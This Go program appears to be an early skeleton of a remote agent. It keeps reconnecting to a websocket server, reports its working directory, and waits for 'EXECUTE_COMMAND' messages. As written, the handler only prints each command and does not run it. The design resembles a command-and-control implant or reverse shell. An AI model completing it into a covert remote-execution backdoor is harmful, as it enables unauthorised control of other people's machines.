package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"os"
	"time"

	"github.com/gorilla/websocket"
)

func main() {
	var u = url.URL{Scheme: "ws", Host: IP_ADDRESSES[0], Path: "/"}

	for {
		fmt.Println("Connecting to:", u.String())

		conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			log.Println("dial failed:", err)
			time.Sleep(3 * time.Second)
			continue // try again
		}

		fmt.Println("Connected!")

		// Send initial message
		dir, _ := os.Getwd()
		if err := sendMessage(conn, "CREATE_CONNECTION", dir); err != nil {
			log.Println("Failed to send:", err)
			conn.Close()
			time.Sleep(3 * time.Second)
			continue
		}

		// Read until disconnected
		for {
			_, msgBytes, err := conn.ReadMessage()
			if err != nil {
				log.Println("Connection lost. Retrying...")
				conn.Close()
				time.Sleep(3 * time.Second)
				break // break out → reconnect
			}

			var incoming Message
			if err := json.Unmarshal(msgBytes, &incoming); err != nil {
				log.Println("⚠️ Invalid JSON:", err)
				continue
			}

			switch incoming.Type {

			case "EXECUTE_COMMAND":
				fmt.Println("Executing command:", incoming.Content)
			default:
				fmt.Println("Unknown message type:", incoming.Type)
			}

		}
	}
}
